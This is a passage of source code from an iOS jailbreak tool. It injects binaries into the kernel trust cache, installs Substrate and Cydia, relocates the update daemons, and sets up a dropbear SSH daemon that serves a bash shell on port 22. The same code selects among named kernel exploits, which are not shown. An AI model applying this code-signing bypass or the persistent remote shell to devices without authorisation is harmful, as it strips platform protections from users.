    resourcesPkgs = [@[@"system-memory-reset-fix"] arrayByAddingObjectsFromArray:resourcesPkgs];
    
    if (betaFirmware) {
        resourcesPkgs = [@[@"com.parrotgeek.nobetaalert"] arrayByAddingObjectsFromArray:resourcesPkgs];
    }
    if (kCFCoreFoundationVersionNumber >= 1535.12) {
        resourcesPkgs = [@[@"com.ps.letmeblock"] arrayByAddingObjectsFromArray:resourcesPkgs];
    }
    
    NSMutableArray *pkgsToRepair = [NSMutableArray new];
    LOG("Resource Pkgs: \"%@\".", resourcesPkgs);
    for (NSString *pkg in resourcesPkgs) {
        // Ignore mobilesubstrate because we just handled that separately.
        if ([pkg isEqualToString:@"mobilesubstrate"] || [pkg isEqualToString:@"firmware"])
            continue;
        if (verifySums([NSString stringWithFormat:@"/var/lib/dpkg/info/%@.md5sums", pkg], HASHTYPE_MD5)) {
            LOG("Pkg \"%@\" verified.", pkg);
        } else {
            LOG(@"Need to repair \"%@\".", pkg);
            if ([pkg isEqualToString:@"signing-certificate"]) {
                // Hack to make sure it catches the Depends: version if it's already installed
                [debsToInstall addObject:debForPkg(@"jailbreak-resources")];
            }
            [pkgsToRepair addObject:pkg];
        }
    }
    if (pkgsToRepair.count > 0) {
        LOG(@"(Re-)Extracting \"%@\".", pkgsToRepair);
        NSArray *debsToRepair = debsForPkgs(pkgsToRepair);
        _assert(debsToRepair.count == pkgsToRepair.count, @"Failed to copy over our resources to RootFS.", true);
        _assert(extractDebs(debsToRepair), @"Failed to copy over our resources to RootFS.", true);
        [debsToInstall addObjectsFromArray:debsToRepair];
    }
    
    // Ensure ldid's symlink isn't missing
    // (it's created by update-alternatives which may not have been called yet)
    if (access("/usr/bin/ldid", F_OK) != ERR_SUCCESS) {
        _assert(access("/usr/libexec/ldid", F_OK) == ERR_SUCCESS, @"Failed to copy over our resources to RootFS.", true);
        _assert(ensure_symlink("../libexec/ldid", "/usr/bin/ldid"), @"Failed to copy over our resources to RootFS.", true);
    }
    
    // These don't need to lay around
    clean_file("/Library/LaunchDaemons/jailbreakd.plist");
    clean_file("/jb/jailbreakd.plist");
    clean_file("/jb/amfid_payload.dylib");
    clean_file("/jb/libjailbreak.dylib");
    
    LOG("Successfully copied over our resources to RootFS.");
    
    
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Injecting..."];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    
    //INJECT
    LOG("Injecting trust cache...");
    NSArray *resources = [NSArray arrayWithContentsOfFile:@"/usr/share/jailbreak/injectme.plist"];
    // If substrate is already running but was broken, skip injecting again
    if (!skipSubstrate) {
        resources = [@[@"/usr/libexec/substrate"] arrayByAddingObjectsFromArray:resources];
    }
    resources = [@[@"/usr/libexec/substrated"] arrayByAddingObjectsFromArray:resources];
    _assert(injectTrustCache(resources, GETOFFSET(trustcache), pmap_load_trust_cache) == ERR_SUCCESS, @"Failed to inject trust cache.", true);
    LOG("Successfully injected trust cache.");
    
    //REPAIR
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Fixing DPKG..."];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    
    LOG("Repairing filesystem...");
    
    _assert(ensure_directory("/var/lib", 0, 0755), @"Failed to repair filesystem.", true);
    
    // Make sure dpkg is not corrupted
    if (is_directory("/var/lib/dpkg")) {
        if (is_directory("/Library/dpkg")) {
            LOG(@"Removing /var/lib/dpkg...");
            _assert(clean_file("/var/lib/dpkg"), @"Failed to repair filesystem.", true);
        } else {
            LOG(@"Moving /var/lib/dpkg to /Library/dpkg...");
            _assert([[NSFileManager defaultManager] moveItemAtPath:@"/var/lib/dpkg" toPath:@"/Library/dpkg" error:nil], @"Failed to repair filesystem.", true);
        }
    }
    
    _assert(ensure_symlink("/Library/dpkg", "/var/lib/dpkg"), @"Failed to repair filesystem.", true);
    _assert(ensure_directory("/Library/dpkg", 0, 0755), @"Failed to repair filesystem.", true);
    _assert(ensure_file("/var/lib/dpkg/status", 0, 0644), @"Failed to repair filesystem.", true);
    _assert(ensure_file("/var/lib/dpkg/available", 0, 0644), @"Failed to repair filesystem.", true);
    
    // Make sure firmware-sbin package is not corrupted.
    NSString *file = [NSString stringWithContentsOfFile:@"/var/lib/dpkg/info/firmware-sbin.list" encoding:NSUTF8StringEncoding error:nil];
    if ([file containsString:@"/sbin/fstyp"] || [file containsString:@"\n\n"]) {
        // This is not a stock file for iOS11+
        file = [file stringByReplacingOccurrencesOfString:@"/sbin/fstyp\n" withString:@""];
        file = [file stringByReplacingOccurrencesOfString:@"\n\n" withString:@"\n"];
        [file writeToFile:@"/var/lib/dpkg/info/firmware-sbin.list" atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
    
    // Make sure this is a symlink - usually handled by ncurses pre-inst
    _assert(ensure_symlink("/usr/lib", "/usr/lib/_ncurses"), @"Failed to repair FS", true);
    
    // This needs to be there for Substrate to work properly
    _assert(ensure_directory("/Library/Caches", 0, S_ISVTX | S_IRWXU | S_IRWXG | S_IRWXO), @"Failed to repair filesystem.", true);
    LOG("Successfully repaired filesystem.");
    
    
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Starting Substrate..."];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    //START SUBSTRATE
    LOG("Starting Substrate...");
    if (!is_symlink("/usr/lib/substrate")) {
        _assert([[NSFileManager defaultManager] moveItemAtPath:@"/usr/lib/substrate" toPath:@"/Library/substrate" error:nil], @"Where is substrate? ERROR", true);
        _assert(ensure_symlink("/Library/substrate", "/usr/lib/substrate"), @"Failed to (re)start Substrate", true);
    }
    _assert(runCommand("/usr/libexec/substrate", NULL) == ERR_SUCCESS, @"Failed to restart Substrate", skipSubstrate?false:true);
    LOG("Successfully started Substrate.");
    
    
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Extracting Bootstrap..."];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    
    // Extract bootstrap.
    LOG("Extracting bootstrap...");
    
    // Test dpkg
    if (!pkgIsConfigured("dpkg")) {
        LOG("Extracting dpkg...");
        _assert(extractDebsForPkg(@"dpkg", debsToInstall, false), @"Failed to extract bootstrap.", true);
        NSString *dpkg_deb = debForPkg(@"dpkg");
        _assert(installDeb(dpkg_deb.UTF8String, true), @"Failed to extract bootstrap.", true);
        [debsToInstall removeObject:dpkg_deb];
    }
    
    if (needStrap || !pkgIsConfigured("firmware")) {
        LOG("Extracting Cydia...");
        if (access("/usr/libexec/cydia/firmware.sh", F_OK) != ERR_SUCCESS || !pkgIsConfigured("cydia")) {
            NSArray *fwDebs = debsForPkgs(@[@"cydia", @"cydia-lproj", @"darwintools", @"uikittools", @"system-cmds"]);
            _assert(fwDebs != nil, @"Error installing debs.", true);
            _assert(installDebs(fwDebs, true), @"Failed to extract bootstrap.", true);
            rv = _system("/usr/libexec/cydia/firmware.sh");
            _assert(WEXITSTATUS(rv) == 0, @"Failed to extract bootstrap.", true);
        }
    }
    
    // Dpkg better work now
    
    if (pkgIsInstalled("science.xnu.undecimus.resources")) {
        LOG("Removing old resources...");
        _assert(removePkg("science.xnu.undecimus.resources", true), @"Failed to extract bootstrap.", true);
    }
    
    if (pkgIsInstalled("jailbreak-resources-with-cert")) {
        LOG("Removing resources-with-cert...");
        _assert(removePkg("jailbreak-resources-with-cert", true), @"Failed to extract bootstrap.", true);
    }
    
    if ((pkgIsInstalled("apt7") && compareInstalledVersion("apt7", "lt", "1:0")) ||
        (pkgIsInstalled("apt7-lib") && compareInstalledVersion("apt7-lib", "lt", "1:0")) ||
        (pkgIsInstalled("apt7-key") && compareInstalledVersion("apt7-key", "lt", "1:0"))
        ) {
        LOG("Installing newer version of apt7");
        NSArray *apt7debs = debsForPkgs(@[@"apt7", @"apt7-key", @"apt7-lib"]);
        _assert(apt7debs != nil && apt7debs.count == 3, @"Failed to extract bootstrap.", true);
        for (NSString *deb in apt7debs) {
            if (![debsToInstall containsObject:deb]) {
                [debsToInstall addObject:deb];
            }
        }
    }
    
    if (debsToInstall.count > 0) {
        LOG("Installing manually exctracted debs...");
        _assert(installDebs(debsToInstall, true), @"Failed to extract bootstrap.", true);
    }
    
    _assert(ensure_directory("/etc/apt/tw3lve", 0, 0755), @"Failed to extract bootstrap.", true);
    clean_file("/etc/apt/sources.list.d/tw3lve");
    const char *listPath = "/etc/apt/tw3lve/tw3lve.list";
    NSString *listContents = @"deb file:///var/lib/tw3lve/apt ./\n";
    NSString *existingList = [NSString stringWithContentsOfFile:@(listPath) encoding:NSUTF8StringEncoding error:nil];
    if (![listContents isEqualToString:existingList]) {
        clean_file(listPath);
        [listContents writeToFile:@(listPath) atomically:NO encoding:NSUTF8StringEncoding error:nil];
    }
    init_file(listPath, 0, 0644);
    NSString *repoPath = pathForResource(@"apt");
    _assert(repoPath != nil, @"Repo path is null!", true);
    ensure_directory("/var/lib/tw3lve", 0, 0755);
    ensure_symlink([repoPath UTF8String], "/var/lib/tw3lve/apt");
    if (!pkgIsConfigured("apt1.4") || !aptUpdate()) {
        NSArray *aptNeeded = resolveDepsForPkg(@"apt1.4", false);
        _assert(aptNeeded != nil && aptNeeded.count > 0, @"Failed to extract bootstrap.", true);
        NSArray *aptDebs = debsForPkgs(aptNeeded);
        _assert(installDebs(aptDebs, true), @"Failed to extract bootstrap.", true);
        _assert(aptUpdate(), @"Failed to extract bootstrap.", true);
    }
    
    // Workaround for what appears to be an apt bug
    ensure_symlink("/var/lib/tw3lve/apt/./Packages", "/var/lib/apt/lists/_var_lib_tw3lve_apt_._Packages");
    
    if (debsToInstall.count > 0) {
        // Install any depends we may have ignored earlier
        _assert(aptInstall(@[@"-f"]), @"Failed to extract bootstrap.", true);
        debsToInstall = nil;
    }
    
    // Now that things are running, let's install the deb for the files we just extracted
    if (needSubstrate) {
        if (pkgIsInstalled("com.ex.substitute")) {
            _assert(removePkg("com.ex.substitute", true), @"Failed to extract bootstrap.", true);
        }
        _assert(aptInstall(@[@"mobilesubstrate"]), @"Failed to extract bootstrap.", true);
    }
    if (!betaFirmware) {
        if (pkgIsInstalled("com.parrotgeek.nobetaalert")) {
            _assert(removePkg("com.parrotgeek.nobetaalert", true), @"Failed to extract bootstrap.", true);
        }
    }
    if (!(kCFCoreFoundationVersionNumber >= 1535.12)) {
        if (pkgIsInstalled("com.ps.letmeblock")) {
            _assert(removePkg("com.ps.letmeblock", true), @"Failed to extract bootstrap.", true);
        }
    }
    
    NSData *file_data = [[NSString stringWithFormat:@"%f\n", kCFCoreFoundationVersionNumber] dataUsingEncoding:NSUTF8StringEncoding];
    if (![[NSData dataWithContentsOfFile:@"/.installed_tw3lve"] isEqual:file_data]) {
        _assert(clean_file("/.installed_tw3lve"), @"Failed to extract bootstrap.", true);
        _assert(create_file_data("/.installed_tw3lve", 0, 0644, file_data), @"Failed to extract bootstrap.", true);
    }
    
    // Make sure everything's at least as new as what we bundled
    rv = system("dpkg --configure -a");
    _assert(WEXITSTATUS(rv) == ERR_SUCCESS, @"Error configuring packages.", true);
    _assert(aptUpgrade(), @"Error updating sources", true);
    
    // Make sure Substrate is injected to the trust cache
    _assert(injectTrustCache(@[@"/usr/libexec/substrate", @"/usr/libexec/substrated"], GETOFFSET(trustcache), pmap_load_trust_cache) == ERR_SUCCESS, @"Error injecting", true);
    
    clean_file("/jb/tar");
    clean_file("/jb/lzma");
    clean_file("/jb/substrate.tar.lzma");
    clean_file("/electra");
    clean_file("/.bootstrapped_electra");
    clean_file("/usr/lib/libjailbreak.dylib");
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Bootstrap Extracted!"];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    
    LOG("Successfully extracted bootstrap.");
    

    
    
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Hey, Cydia! SUDO Don't stash!"];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    
    });
    _assert(ensure_file("/.cydia_no_stash", 0, 0644), @"Error disabling stashing... Shit.", true);
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Cydia Be Like: OKAY SIR"];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Fixing some issues..."];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    
    //FIXES
    LOG("Fixing storage preferences...");
    if (access("/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/softwareupdated", F_OK) == ERR_SUCCESS) {
        _assert(rename("/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/softwareupdated", "/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/Support/softwareupdated") == ERR_SUCCESS, @"Failed to fix storage preferences.", false);
    }
    if (access("/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/softwareupdateservicesd", F_OK) == ERR_SUCCESS) {
        _assert(rename("/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/softwareupdateservicesd", "/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/Support/softwareupdateservicesd") == ERR_SUCCESS, @"Failed to fix storage preferences.", false);
    }
    if (access("/System/Library/com.apple.mobile.softwareupdated.plist", F_OK) == ERR_SUCCESS) {
        _assert(rename("/System/Library/com.apple.mobile.softwareupdated.plist", "/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist") == ERR_SUCCESS, @"Failed to fix storage preferences.", false);
        _assert(runCommand("/bin/launchctl", "load", "/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist", NULL) == ERR_SUCCESS, @"Failed to fix storage preferences.", false);
    }
    if (access("/System/Library/com.apple.softwareupdateservicesd.plist", F_OK) == ERR_SUCCESS) {
        _assert(rename("/System/Library/com.apple.softwareupdateservicesd.plist", "/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist") == ERR_SUCCESS, @"Error fixing storage", false);
        _assert(runCommand("/bin/launchctl", "load", "/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist", NULL) == ERR_SUCCESS, @"Failed to fix storage preferences.", false);
    }
    LOG("Successfully fixed storage preferences.");
    
    if (needStrap || needSubstrate)
    {
        runOnMainQueueWithoutDeadlocking(^{
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Installing Cydia..."];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        
        LOG("Installing Cydia...");
        NSString *cydiaVer = versionOfPkg(@"cydia");
        _assert(cydiaVer!=nil, @"Cydia version is null!", true);
        _assert(aptInstall(@[@"--reinstall", [@"cydia" stringByAppendingFormat:@"=%@", cydiaVer]]), @"Failed to install Cydia", true);
        LOG("Successfully installed Cydia.");
        
        NOTICE(NSLocalizedString(@"We extracted our bootstrap and installed Cydia. We are going to reboot your device now.", nil), 1, 1);
        
        
        LOG("Rebooting...");
        reboot(RB_QUICK);
    }
    
    if (load_tweaks_bool)
    {
        runOnMainQueueWithoutDeadlocking(^{
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Loading Tweaks..."];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        clean_file("/var/tmp/.substrated_disable_loader");
    } else
    {
        runOnMainQueueWithoutDeadlocking(^{
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Disabling Substrate Loader..."];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        _assert(create_file("/var/tmp/.substrated_disable_loader", 0, 644), @"Unable To Disable Installation Of Tweaks!", true);
    }
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Running UICache..."];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    
    
    LOG("Running uicache...");
    _assert(runCommand("/usr/bin/uicache", NULL) == ERR_SUCCESS, @"Failed to run uicache.", true);
    LOG("Successfully ran uicache.");
    
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Loading Daemons..."];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    
    LOG("Loading Daemons...");
    system("echo 'really jailbroken';"
           "shopt -s nullglob;"
           "for a in /Library/LaunchDaemons/*.plist;"
           "do echo loading $a;"
           "launchctl load \"$a\" ;"
           "done; ");
    // Substrate is already running, no need to run it again
    system("for file in /etc/rc.d/*; do "
           "if [[ -x \"$file\" && \"$file\" != \"/etc/rc.d/substrate\" ]]; then "
           "\"$file\";"
           "fi;"
           "done");
    LOG("Successfully loaded Daemons.");
    
    
    if (load_tweaks_bool)
    {
        rv = system("nohup bash -c \""
                    "sleep 1 ;"
                    "launchctl stop com.apple.mDNSResponder ;"
                    "launchctl stop com.apple.backboardd"
                    "\" >/dev/null 2>&1 &");
        
        
        _assert(WEXITSTATUS(rv) == ERR_SUCCESS, @"Failed to load daemons!", true);
        LOG("Successfully loaded Tweaks.");
    }
    
    
}






void enableSSH()
{
    LOG("Enabling SSH...");
    NSMutableArray *toInject = [NSMutableArray new];
    if (!verifySums(pathForResource(@"binpack64-256.md5sums"), HASHTYPE_MD5)) {
        ArchiveFile *binpack64 = [ArchiveFile archiveWithFile:pathForResource(@"binpack64-256.tar.lzma")];
        _assert(binpack64 != nil, @"Failed to enable SSH.", true);
        _assert([binpack64 extractToPath:@"/jb"], @"Failed to enable SSH.", true);
        for (NSString *file in binpack64.files.allKeys) {
            NSString *path = [@"/jb" stringByAppendingPathComponent:file];
            if (cdhashFor(path) != nil) {
                if (![toInject containsObject:path]) {
                    [toInject addObject:path];
                }
            }
        }
    }
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSDirectoryEnumerator *directoryEnumerator = [fileManager enumeratorAtURL:[NSURL URLWithString:@"/jb"] includingPropertiesForKeys:@[NSURLIsDirectoryKey] options:0 errorHandler:nil];
    _assert(directoryEnumerator != nil, @"Directory not valid!", true);
    for (NSURL *URL in directoryEnumerator) {
        NSString *path = [URL path];
        if (cdhashFor(path) != nil) {
            if (![toInject containsObject:path]) {
                [toInject addObject:path];
            }
        }
    }
    for (NSString *file in [fileManager contentsOfDirectoryAtPath:@"/Applications" error:nil]) {
        NSString *path = [@"/Applications" stringByAppendingPathComponent:file];
        NSMutableDictionary *info_plist = [NSMutableDictionary dictionaryWithContentsOfFile:[path stringByAppendingPathComponent:@"Info.plist"]];
        if (info_plist == nil) continue;
        if ([info_plist[@"CFBundleIdentifier"] hasPrefix:@"com.apple."]) continue;
        directoryEnumerator = [fileManager enumeratorAtURL:[NSURL URLWithString:path] includingPropertiesForKeys:@[NSURLIsDirectoryKey] options:0 errorHandler:nil];
        if (directoryEnumerator == nil) continue;
        for (NSURL *URL in directoryEnumerator) {
            NSString *path = [URL path];
            if (cdhashFor(path) != nil) {
                if (![toInject containsObject:path]) {
                    [toInject addObject:path];
                }
            }
        }
    }
    if (toInject.count > 0) {
        _assert(injectTrustCache(toInject, GETOFFSET(trustcache), pmap_load_trust_cache) == ERR_SUCCESS, @"Failed to enable SSH.", true);
    }
    _assert(ensure_symlink("/jb/usr/bin/scp", "/usr/bin/scp"), @"Failed to enable SSH.", true);
    _assert(ensure_directory("/usr/local/lib", 0, 0755), @"Failed to enable SSH.", true);
    _assert(ensure_directory("/usr/local/lib/zsh", 0, 0755), @"Failed to enable SSH.", true);
    _assert(ensure_directory("/usr/local/lib/zsh/5.0.8", 0, 0755), @"Failed to enable SSH.", true);
    _assert(ensure_symlink("/jb/usr/local/lib/zsh/5.0.8/zsh", "/usr/local/lib/zsh/5.0.8/zsh"), @"Failed to enable SSH.", true);
    _assert(ensure_symlink("/jb/bin/zsh", "/bin/zsh"), @"Failed to enable SSH.", true);
    _assert(ensure_symlink("/jb/etc/zshrc", "/etc/zshrc"), @"Failed to enable SSH.", true);
    _assert(ensure_symlink("/jb/usr/share/terminfo", "/usr/share/terminfo"), @"Failed to enable SSH.", true);
    _assert(ensure_symlink("/jb/usr/local/bin", "/usr/local/bin"), @"Failed to enable SSH.", true);
    _assert(ensure_symlink("/jb/etc/profile", "/etc/profile"), @"Failed to enable SSH.", true);
    _assert(ensure_directory("/etc/dropbear", 0, 0755), @"Failed to enable SSH.", true);
    _assert(ensure_directory("/jb/Library", 0, 0755), @"Failed to enable SSH.", true);
    _assert(ensure_directory("/jb/Library/LaunchDaemons", 0, 0755), @"Failed to enable SSH.", true);
    _assert(ensure_directory("/jb/etc/rc.d", 0, 0755), @"Failed to enable SSH.", true);
    if (access("/jb/Library/LaunchDaemons/dropbear.plist", F_OK) != ERR_SUCCESS) {
        NSMutableDictionary *dropbear_plist = [NSMutableDictionary new];
        _assert(dropbear_plist, @"Drop bear plist?", true);
        dropbear_plist[@"Program"] = @"/jb/usr/local/bin/dropbear";
        dropbear_plist[@"RunAtLoad"] = @YES;
        dropbear_plist[@"Label"] = @"ShaiHulud";
        dropbear_plist[@"KeepAlive"] = @YES;
        dropbear_plist[@"ProgramArguments"] = [NSMutableArray new];
        dropbear_plist[@"ProgramArguments"][0] = @"/usr/local/bin/dropbear";
        dropbear_plist[@"ProgramArguments"][1] = @"-F";
        dropbear_plist[@"ProgramArguments"][2] = @"-R";
        dropbear_plist[@"ProgramArguments"][3] = @"--shell";
        dropbear_plist[@"ProgramArguments"][4] = @"/jb/bin/bash";
        dropbear_plist[@"ProgramArguments"][5] = @"-p";
        dropbear_plist[@"ProgramArguments"][6] = @"22";
        _assert([dropbear_plist writeToFile:@"/jb/Library/LaunchDaemons/dropbear.plist" atomically:YES], @"Failed to enable SSH.", true);
        _assert(init_file("/jb/Library/LaunchDaemons/dropbear.plist", 0, 0644), @"Failed to enable SSH.", true);
    }
    for (NSString *file in [fileManager contentsOfDirectoryAtPath:@"/jb/Library/LaunchDaemons" error:nil]) {
        NSString *path = [@"/jb/Library/LaunchDaemons" stringByAppendingPathComponent:file];
        runCommand("/jb/bin/launchctl", "load", path.UTF8String, NULL);
    }
    for (NSString *file in [fileManager contentsOfDirectoryAtPath:@"/jb/etc/rc.d" error:nil]) {
        NSString *path = [@"/jb/etc/rc.d" stringByAppendingPathComponent:file];
        if ([fileManager isExecutableFileAtPath:path]) {
            runCommand("/jb/bin/bash", "-c", path.UTF8String, NULL);
        }
    }
    _assert(runCommand("/jb/bin/launchctl", "stop", "com.apple.cfprefsd.xpc.daemon", NULL) == ERR_SUCCESS, @"Failed to enable SSH.", true);
    LOG("Successfully enabled SSH.");
}


/***
 Thanks Conor
 **/
void runOnMainQueueWithoutDeadlocking(void (^block)(void))
{
    if ([NSThread isMainThread])
    {
        block();
    }
    else
    {
        dispatch_sync(dispatch_get_main_queue(), block);
    }
}

//0 = machswap
//1 = machswap2
//2 = voucher_swap

- (IBAction)clickedMe:(id)sender {
    NSLog(@"Staring...");
    
    prefs_t prefs;
    NSUserDefaults *userDefaults = nil;
    NSDictionary *userDefaultsDictionary = nil;
    NSString *user = @"mobile";
    userDefaults = [[NSUserDefaults alloc] initWithUser:user];
    userDefaultsDictionary = [userDefaults dictionaryRepresentation];
    NSBundle *bundle = [NSBundle mainBundle];
    NSDictionary *infoDictionary = [bundle infoDictionary];
    NSString *homeDirectory = NSHomeDirectory();
    NSString *bundleIdentifierKey = @"CFBundleIdentifier";
    NSString *bundleIdentifier = [infoDictionary objectForKey:bundleIdentifierKey];
    prefsFile = [NSString stringWithFormat:@"%@/Library/Preferences/%@.plist", homeDirectory, bundleIdentifier];
    
    load_prefs(&prefs, userDefaultsDictionary);
    
    
    if (prefs.exploit == mach_swap_exploit)
    {
        LOG(@"Using Machswap");
        exploit = 0;
    }
    
    if (prefs.exploit == mach_swap_2_exploit)
    {
        LOG(@"Using Machswap2");
        exploit = 1;
    }
    
    if (prefs.exploit == voucher_swap_exploit)
    {
        LOG(@"Using voucher_swap");
        exploit = 2;
    }
    
    if (prefs.restoreFS)
    {
        restore_rootfs_bool = true;
    }
    
    if (!prefs.restoreFS)
    {
        restore_rootfs_bool = false;
    }
    
    
    if (prefs.loadTweaksPlz)
    {
        load_tweaks_bool = true;
    }
    
    if (!prefs.loadTweaksPlz)
    {
        load_tweaks_bool = false;
    }
    
    if (prefs.disableAutoUpdatesPlz)
    {
        disable_auto_updates = true;
    }
    
    if (!prefs.disableAutoUpdatesPlz)
    {
        disable_auto_updates = false;
    }
    
    if (prefs.disableAppRevokesPlz)
    {
        disable_app_revokes = true;
    }
    
    if (!prefs.disableAppRevokesPlz)
    {
        disable_app_revokes = false;
    }
    
    
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0ul), ^{
        jailbreak();
    });
}



@end
